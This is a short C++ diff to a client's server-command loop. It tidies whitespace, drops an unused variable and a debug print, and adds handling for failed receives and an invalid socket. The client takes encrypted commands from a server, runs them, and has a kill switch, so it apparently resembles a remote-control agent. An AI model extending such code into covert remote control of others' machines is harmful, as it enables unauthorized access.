@@ -199,7 +199,7 @@ const CMDDESC Client::CreateCommandDescription(const Packet& command) {
 }
 
 BOOL Client::PerformCommand(const Packet& command, ClientResponse& outResponse) {
-    BOOL    success        = FALSE;
+    BOOL    success     = FALSE;
     CMDDESC description = CreateCommandDescription(command);
 
     switch ( command.action ) {
@@ -256,7 +256,6 @@ Packet Client::OnEncryptedPacket(BYTESTRING encrypted) {
 
 void Client::ListenForServerCommands() {
     BOOL received = FALSE;
-    BOOLEAN state = FALSE;
     while ( TRUE ) {
         BYTESTRING encrypted;
 
@@ -266,6 +265,13 @@ void Client::ListenForServerCommands() {
             TCP
         );
 
+        if ( !received ) {
+            if ( this->m_TCPSocket == INVALID_SOCKET )
+                break;
+            
+            continue;
+        }
+
         Packet receivedPacket = OnEncryptedPacket(encrypted);
         ClientResponse responseToServer;
         
@@ -274,7 +280,6 @@ void Client::ListenForServerCommands() {
             m_NetworkManager.TransmitData(receivedPacket, this->m_TCPSocket, TCP, NULL_ADDR, true, this->m_ServerPublicKey, false);
             continue;
         } else if ( receivedPacket.action == kKillClient ) {
-            CLIENT_DBG("Is kill");
             this->Disconnect();
             break;
         }
